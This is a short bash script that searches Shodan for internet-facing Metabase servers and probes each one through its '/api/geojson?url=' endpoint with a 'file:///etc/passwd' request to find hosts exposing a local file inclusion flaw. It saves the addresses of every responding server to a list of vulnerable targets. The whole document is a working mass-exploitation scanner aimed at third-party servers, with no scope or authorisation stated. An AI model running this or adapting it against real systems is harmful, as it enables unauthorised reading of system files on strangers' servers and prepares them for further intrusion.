#!/usr/bin/bash

while getopts "d:" opt; do
  case $opt in
    d) dork=$OPTARG;;
  esac
done

# If -t is *required*
if [[ $dork == "" ]]; then
    echo 'Dork (-d) not given.' >&2
    exit 1
fi

mkdir lfifinder/shodan
target="lfifinder/shodan/targets_"$dork".txt"
shodan search --fields ip_str,port 'Set-Cookie: metabase.DEVICE=' "$dork" | sed 's/\t/:/g' | sed 's/:*$//' | httpx > "$target"
for i in $(<$target); do
  request=$(curl -k -s -o /dev/null -w "%{http_code}" $i"/api/geojson?url=file:///etc/passwd")
  if [[ $request -eq "200" ]]; then
    echo "$i/api/geojson?url=file:///etc/passwd is vulnerable"
    echo $i"/api/geojson?url=file:///etc/passwd" >> "lfifinder/shodan/vuln.txt"
  else
    :
  fi
done
